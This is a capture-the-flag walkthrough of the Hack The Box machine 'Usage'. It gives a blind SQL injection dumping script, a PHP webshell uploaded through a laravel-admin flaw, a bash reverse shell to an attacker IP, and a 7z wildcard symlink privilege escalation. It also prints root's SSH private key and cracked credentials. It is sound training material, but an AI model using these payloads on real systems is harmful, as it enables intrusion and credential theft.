---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: subdomainenumeration sqli blindsqlinjection laravel-admin webshell abusingfileupload remotecodeexecution reverseengineering ghidra binary sudoers symlink symboliclink ghidra c
---

<br />

![1](../../../assets/images/Usage/1.png)

<br />

OS -> Linux.

Difficulty -> Easy.

<br />

# Introduction:

<br />

We’re tackling Usage, an Easy Linux box with a Laravel twist and a sneaky wildcard escalation at the end. We start with a blind SQL injection on the main site that leaks admin credentials. From there, we hit an authenticated file upload vulnerability in laravel-admin to drop a webshell. A reused password lets us pivot to another user, and finally we abuse a wildcard vulnerability in a custom SUID binary to exfiltrate root’s private SSH key and pop root.

<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.11.18 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-30 13:43 CEST
Nmap scan report for 10.10.11.18
Host is up (0.046s latency).
Not shown: 65468 closed tcp ports (reset), 65 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.49 seconds
```

<br />

Open Ports:

- `Port 22` -> ssh

- `Port 80` -> http

<br />

# Http Enumeration: -> Port 80

<br />

When visiting the IP in the browser, it redirects to -> `usage.htb`

So we add this domain to our `/etc/hosts`:

<br />

```bash
echo "10.10.11.18 usage.htb" >> /etc/hosts
```

<br />

Now we can visit the site in the browser:

<br />

![2](../../../assets/images/Usage/2.png)

<br />

On the main page, we find a standard `login` panel. Default credentials don't work.

<br />

### /registration:

<br />

Clicking on `"Register"` (top right) takes us to the `/registration` page.

We can create an account:

<br />

![3](../../../assets/images/Usage/3.png)

<br />

And access it:

<br />

![4](../../../assets/images/Usage/4.png)

<br />

At this stage, no sensitive `features` were accessible from the `user` dashboard.

<br />

### admin.usage.htb:

<br />

Another important element on the main page is the `"Admin"` button located in the top-right corner.

Hovering over it reveals the subdomain -> `http://admin.usage.htb/`.

So, we can add it to `/etc/hosts`:

<br />

```bash
10.10.11.18 usage.htb admin.usage.htb
```

<br />

If we access this `subdomain`, we will see an admin login panel:

<br />

![5](../../../assets/images/Usage/5.png)

<br />

We test default credentials without success.

We’ll try to obtain valid `credentials` and revisit this login panel later.

<br />

### /forget-password:

<br />

Returning to the main page, there is one more functionality.

The `"Reset Password"` link takes us to `/forget-password`:

<br />

![6](../../../assets/images/Usage/6.png)

<br />

If we enter an invalid e-mail, we get the following response:

<br />

![7](../../../assets/images/Usage/7.png)

<br />

On the other hand, if we use the email we registered with, we receive a `successful` response:

<br />

![8](../../../assets/images/Usage/8.png)

<br />

As we know, this kind of function can be vulnerable to `SQL Injection`.

To test this, we use the classic `MySQL` payload:

<br />

```sql 
anything' or 1=1-- -
```

![9](../../../assets/images/Usage/9.png)

<br />

The application appears to be vulnerable to `SQL Injection`.

Now that we know it's injectable, we can try different `payloads` to extract data, but none of the responses return visible content.

This is happening because we're dealing with a `blind` SQL injection.

Blind SQL injection requires inferring information based on behavioral `differences` in the application's responses.

To exploit this type of `SQLi`, we can use `substring` payloads to guess the `DB` content character by character:

<br />

```sql 
anything' or substring(database(),1,1)='u'-- -
```

![10](../../../assets/images/Usage/10.png)

<br />

As we can see, the response to this `payload` was successful.

What does this mean?

This confirms that the first character of the database name is `"u"`.

At this point, we can spend a lot of time dumping all the content from the database.

To save time, I wrote a `Python` script to automate exploitation:

<br />

```python 
#!/usr/bin/env python3

# Author: TheRedP4nther

from termcolor import colored
from pyfiglet import Figlet 
import urllib.parse
from pwn import *
import requests
import string
import signal 
import time
import sys
import re

# Global Variables 
url = "http://usage.htb/forget-password"
characters = string.ascii_lowercase + "_-,$/.=:1234567890" + string.ascii_uppercase

def def_handler(sig, frame):
    print(colored("\n\n[!] Leaving the program...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def banner():
    f = Figlet(font="slant")
    banner = f.renderText("TheRedP4nther")
    print(colored(banner, "red"))

def getCookies():
    global session
    session = requests.Session()
    cookies = []

    try:
        r = session.get(url, timeout=3)
        content = session.cookies.get_dict()
        html = r.content.decode()
        match = re.findall(r'value="(\w+)">', html)
        if not match:
            print(colored("\n[!] Error trying to get the token!\n", "red"))
            sys.exit(1)
        global token
        token = match[0]

    except requests.exceptions.RequestException:
        print(colored("\n[!] Error trying to get the cookies!\n", "red"))
        sys.exit(1)

def getDatabases():
    p1 = log.progress(colored("Exploiting Blind SQL Injection", "yellow"))
    p2 = log.progress(colored("Databases", "yellow"))
    content = ""

    for i in range(1, 200):
        for character in characters:
            data = {
                "_token": token,
                "email": f"test' or substring(database(),{i},1)='{character}'-- -"
            }

            p1.status(colored(data['email'], "white"))

            try: 
                r = session.post(url, data=data, timeout=3)
                if "We have e-mailed your password" in r.text:
                    content += character
                    p2.status(colored(content, "white"))
                    if content.strip() == "usage_blog":
                        return session, token
                    break
            except requests.exceptions.RequestException:
                pass

def getTables():
    print(colored(f"\n[+] CURRENT DATABASE: usage_blog\n", "cyan"))
    p1 = log.progress(colored("Exploiting Blind SQL Injection", "yellow"))
    p2 = log.progress(colored("Tables", "yellow"))
    content = ""
    
    for i in range(1, 1000):
        for character in characters:
            data = {
                "_token": token,
                "email": f"test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),{i},1)='{character}'-- -"
            }

            p1.status(colored(data['email'], "white"))

            try: 
                r = session.post(url, data=data, timeout=3)
                if "We have e-mailed your password" in r.text:
                    content += character 
                    p2.status(colored(content, "white"))
                    if content.strip() == "admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users":
                        return session, token
                    break
            except requests.exceptions.RequestException:
                pass

def getColumns():
    print(colored("\n[+] CURRENT TABLE: admin_users\n", "cyan"))
    p1 = log.progress(colored("Exploiting Blind SQL Injection", "yellow"))
    p2 = log.progress(colored("Username And Password", "yellow"))
    content = ""
    
    for i in range(1, 1000):
        for character in characters:
            data = {
                "_token": token,
                "email": f"test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),{i},1)='{character}'-- -"
            }

            p1.status(colored(data['email'], "white"))

            try: 
                r = session.post(url, data=data, timeout=3)
                if "We have e-mailed your password" in r.text:
                    content += character 
                    p2.status(colored(content, "white"))
                    if content.strip() == "admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2":
                        print(colored("\n[+] USER: admin", "cyan"))
                        print(colored("[+] HASH: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2","cyan"))
                        print(colored("\n[+] Blind SQL Injection successfully exploited!\n", "green"))
                        sys.exit(1)
                    break
            except requests.exceptions.RequestException:
                pass

def main():
    banner()
    getCookies()
    getDatabases()
    getTables()
    getColumns()

if __name__ == '__main__':
    main()
```

<br />

We can execute and get the DB `user` and `hash`:

<br />

```bash
❯ python3 exploit.py
  ________         ____           ______  __ __        __  __             
 /_  __/ /_  ___  / __ \___  ____/ / __ \/ // / ____  / /_/ /_  ___  _____
  / / / __ \/ _ \/ /_/ / _ \/ __  / /_/ / // /_/ __ \/ __/ __ \/ _ \/ ___/
 / / / / / /  __/ _, _/  __/ /_/ / ____/__  __/ / / / /_/ / / /  __/ /    
/_/ /_/ /_/\___/_/ |_|\___/\__,_/_/      /_/ /_/ /_/\__/_/ /_/\___/_/     
                                                                          

[▗] Exploiting Blind SQL Injection: test' or substring(database(),10,1)='g'-- -
[◐] Databases: usage_blog

[+] CURRENT DATABASE: usage_blog

[▁] Exploiting Blind SQL Injection: test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),151,1)='s'-- -
[*] Tables: admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users

[+] CURRENT TABLE: admin_users

[◣] Exploiting Blind SQL Injection: test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),66,1)='2'-- -
[/] Username And Password: admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2

[+] USER: admin
[+] HASH: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2

[+] Blind SQL Injection successfully exploited!
```

<br />

Nice! We did it!

Now we can crack the Blowfish Bcrypt hash with `hashcat`:

<br />

```bash
❯ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1 
...[snip]...
```

<br />

We have new credentials: `admin:whatever1`.

<br />

## Laravel Authenticated RCE:

<br />

Using it we can log into the `admin.usage.htb` login panel:

<br />

![11](../../../assets/images/Usage/11.png)

<br />

As we can see, we are inside a `laravel-admin 1.8.18` interface.

What is Laravel?

Laravel is a `PHP-based` web framework for building, deploying and monitoring web applications.

Exactly, in this case, we're dealing with a `laravel-admin`.

After a quick search, we discovered that this version of `laravel-admin` is vulnerable to `arbitrary file upload` ([CVE-2023-2424](https://nvd.nist.gov/vuln/detail/CVE-2023-24249)).

<br />

![12](../../../assets/images/Usage/12.png)

<br />

This vulnerability arises from improper validation of the uploaded file's extension in the `admin profile image upload` function, allowing the upload of a malicious `PHP` file, such as a webshell.

<br />

```php 
<?php system($_REQUEST['cmd']); ?>
```

<br />

To exploit this vulnerability we will go step by step.

<br />

### Step 1 - Go to /admin/auth/setting.

The vulnerable function is the profile `image upload` at this path:

<br />

![13](../../../assets/images/Usage/13.png)

<br />

### Step 2 - Intercept a valid image upload.

We can download any `image` and intercept the upload request with `Burp Suite`.

To do it, we'll select an image in the application and click on `"Submit"`:

<br />

![14](../../../assets/images/Usage/14.png)

<br />

### Step 3 - Change file name and content:

Once intercepted, we send it to the repeater to manipulate the image data and change its name to `cmd.php`:

<br />

![15](../../../assets/images/Usage/15.png)

<br />

### Step 4 - Send the request:

If we do it well, by clicking on `"Send"` and `"follow redirection"`, we will find a text with the file upload `URL` in the response:

<br />

![16](../../../assets/images/Usage/16.png)

<br />

### Step 5 - Access webshell:

Now we can browse our `webshell` and try to execute a `command`:

<br />

![17](../../../assets/images/Usage/17.png)

<br />

As we can see, we are running commands as user `dash`.

To gain access to the system, we will use the typical bash `reverse shell`:

(Important to `url-encode` ampersands to avoid errors -> %26)

<br />

```bash
http://admin.usage.htb/uploads/images/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.22/443 0>%261'
```

<br />

Check the listener:

<br />

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.18] 42414
bash: cannot set terminal process group (1242): Inappropriate ioctl for device
bash: no job control in this shell
dash@usage:/var/www/html/project_admin/public/uploads/images$ id

uid=1000(dash) gid=1000(dash) groups=1000(dash)
dash@usage:/var/www/html/project_admin/public/uploads/images$ cd 
 
dash@usage:~$ cat user.txt

06d491f47ddd1055403cd67deexxxxxx
```

<br />

We've got the `user.txt` flag!

<br />

# Privilege Escalation: dash -> xander

<br />

### .monitrc:

<br />

Once inside the system, we found an unusual file named `.monitrc` in `/home/dash`:

<br />

```bash
dash@usage:~$ ls -la
total 52
drwxr-x--- 6 dash dash 4096 May  1 19:38 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 May  1 19:38 .monit.pid
-rw------- 1 dash dash 1192 May  1 19:38 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 May  1 19:32 user.txt
```

<br />

Let's see its content:

<br />

```bash
dash@usage:~$ cat .monitrc 
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

<br />

This file reveals credentials: `admin:3nc0d3d_pa$$w0rd`

Looking for other users on the machine, we find a second user: `xander`:

<br />

```bash
dash@usage:/home$ ls
dash  xander
```

<br />

We can try using the credentials from `.monitrc` to switch to `xander`:

<br />

```bash
dash@usage:/home$ su xander
Password: 
xander@usage:/home$ id
uid=1001(xander) gid=1001(xander) groups=1001(xander)
```

<br />

# Privilege Escalation: xander -> root 

<br />

This user is allowed to run the following `binary` as any user (including `root`) without providing a password:

<br />

```bash
xander@usage:/home$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

<br />

If we run it, it seems to have three different functions:

<br />

```bash
xander@usage:/home$ sudo /usr/bin/usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3):
```

<br />

Running `"strings"` on the binary, reveals nothing particularly useful:

<br />

```bash
xander@usage:/home$ strings /usr/bin/usage_management 
/lib64/ld-linux-x86-64.so.2
chdir
__cxa_finalize
__libc_start_main
puts
system
__isoc99_scanf
perror
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
Invalid choice.
:*3$"
GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
usage_management.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
backupMysqlData
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
chdir@GLIBC_2.2.5
backupWebContent
system@GLIBC_2.2.5
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
resetAdminPassword
perror@GLIBC_2.2.5
__isoc99_scanf@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

<br />

To perform some `reverse engineering`, we copy the binary to our local machine using `scp`:

<br />

```bash
❯ scp xander@10.10.11.18:/usr/bin/usage_management .
xander@10.10.11.18's password: 
usage_management                                                                                                                                     100%   16KB 126.7KB/s   00:00
```

<br />

Then, we open it with `Ghidra`. 

Viewing the `main` function, it appears to be a program written in `C`:

<br />

![18](../../../assets/images/Usage/18.png)

<br />

To understand all the functions, we will analyze them one by one.

<br />

### Reset Password:

<br />

This function simply prints the string `"Password has been reset"`.

<br />

```c 
void resetAdminPassword(void)

{
  puts("Password has been reset.");
  return;
}
```

<br />

### Backup MySQL data:

<br />

This function is doing a `MySQL` backup using `mysqldump` to extract all the content from the file `"mysql_backup.sql"` on `/var/backups`:

<br />

```c 
void backupMysqlData(void)

{
  system("/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql");
  return;
}
```

<br />

However, there is nothing particularly interesting or abusable about this.

<br />

# 7z Wildcard Vulnerability:

<br />

### Project Backup:

<br />

This is the first option listed in the program's menu.

It uses `7z` to archive the contents of `/var/www/html` into a zip archive named `"project.zip"` at `/var/backups`.

<br />

```c 
void backupWebContent(void)

{
  int iVar1;
  
  iVar1 = chdir("/var/www/html");
  if (iVar1 == 0) {
    system("/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *");
  }
  else {
    perror("Error changing working directory to /var/www/html");
  }
  return;
}
```

<br />

Using an unquoted wildcard `(*)` in a `7z` command is dangerous, because if an attacker has `write permissions` in the target `directory`, they can manipulate what gets included—such as via `symlinks`.

This [page](https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks) explains this concept very well.

First of all, we're going to check if we can write into /var/www/html:

<br />

```bash
xander@usage:/home$ ls -l /var/www/
total 4
drwxrwxrwx 4 root xander 4096 Apr  3  2024 html
```

<br />

Apparently, we have all `permissions` in this directory.

To exploit this vulnerability, we will create a `symlink` to `/root` directory in `/var/www/html` and run the binary:

<br />

```bash
xander@usage:~$ cd /var/www/html
xander@usage:/var/www/html$ ln -s /root root
xander@usage:/var/www/html$ sudo /usr/bin/usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54871532

Scanning the drive:
3185 folders, 18028 files, 132312029 bytes (127 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 21213

                                                                               
Files read from disk: 18028
Archive size: 72301603 bytes (69 MiB)
Everything is Ok
```

<br />

Finally, we unzip the archive:

<br />

```bash
unzip project.zip 
xander@usage:/tmp/Privesc$ ls
project_admin  project.zip  root  usage_blog
```

<br />

And access /root getting the `id_rsa` to connect via `SSH`:

<br />

```bash
xander@usage:/tmp/Privesc/root$ ls
cleanup.sh  root.txt  snap  usage_management.c
xander@usage:/tmp/Privesc/root$ cd .ssh
xander@usage:/tmp/Privesc/root/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```

<br />

To connect via `SSH` and read the `root.txt` flag:

<br />

```bash
xander@usage:/tmp/Privesc/root/.ssh$ ssh -i id_rsa root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:4YfMBkXQJGnXxsf0IOhuOJ1kZ5c1fOLmoOGI70R/mws.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
...[snip]...
Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
root@usage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@usage:~# cat root.txt
0e4900d1fcce6c03c23a7dbea4xxxxxx
```

<br />

Machine pwned!

Thank's for spending your time reading this writeup, I hope you learned a lot. 

Keep hacking!❤️❤️

<br />
